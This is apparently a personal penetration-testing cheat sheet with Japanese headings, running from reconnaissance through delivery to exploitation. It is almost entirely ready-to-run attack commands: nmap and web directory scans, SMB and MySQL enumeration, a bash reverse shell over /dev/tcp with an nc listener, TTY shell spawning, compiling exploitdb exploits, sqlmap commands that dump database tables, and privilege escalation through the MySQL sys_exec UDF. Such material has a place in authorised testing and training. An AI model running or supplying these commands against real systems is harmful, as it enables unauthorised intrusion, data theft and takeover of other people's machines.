🔓🔑

## Reconnaissance

ホスト確認

    nmap -sn [address]/24
    netdiscover -r [address]/24

ポート確認

    nmap -v -p 1-65535 -sV -sT -Pn [HOST]
    nmap -v -A [HOST]

Nmap Scripting Engine

    /usr/share/nmap/scripts #スクリプト所在
    nmap --script=smb-enum-* -p139,445 [address] #Samba

Webサーバ／[dirsearch](https://github.com/maurosoria/dirsearch)

    nikto -h [HOST]
    dirb http://XXX.com/
    python3 dirsearch.py -u http://XXX.com -e * -x 403,404

状態確認

    uname -a
    cat /etc/redhat-release
    cat /proc/version

SSH／認証鍵使わずに接続

     ssh -o PubkeyAuthentication=no user@10.0...

MySQL

     mysql -u root -p
     show databases;
     use ids;
     show tables;
     select * from idtable;

Samba

    smbclient //[address]/[dir] -U [user]

[SQL Injection Authentication Bypass Cheat Sheet](https://exploit.linuxsec.org/sql-injection-authentication-bypass-cheat-sheet/)

## Delivery

http転送

    python -m SimpleHTTPServer 9998
    wget http://address:9998/file


## Exploitation

Spawning A TTY Shell

    echo os.system('/bin/bash') #LShell
    /bin/sh -i
    python -c 'import pty; pty.spawn("/bin/sh")'
    ruby -e 'exec "/bin/bash"'


[bashリバースシェル](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

    nc -lvp 9999
    ;bash -i >& /dev/tcp/ip/9999 0>&1

[exploitdb](https://github.com/offensive-security/exploitdb)

    searchsploit CentOS 4.0
    cp /opt/exploitdb/exploits/linux_x86/local/XXX.c XXX.c
    gcc gcc XXX.c -o test
    ./test

sqlmap 

    sqlmap -u "http://XXX.com/db.php?id=XXX" --dbms=MySQL #GET
    sqlmap -u "http://XXX.com/db.php" --method POST --data "id=XXX" #POST

    sqlmap -u "http://XXX.com/db.php?id=XXX" --dbms=MySQL --dbs 
    sqlmap -u "http://XXX.com/db.php?id=XXX" --dbms=MySQL -D [db_name] --tables 
    sqlmap -u "http://XXX.com/db.php?id=XXX" --dbms=MySQL -D [db_name] --T [tb_name] --dump

MySQL Root to System Root with lib_mysqludf_sys

    use mysql;
    select * from func;
    select sys_exec('usermod -a -G admin [user]');


[LinEnum](https://github.com/rebootuser/LinEnum)

    ./LinEnum.sh -r repo -e /tmp/.le



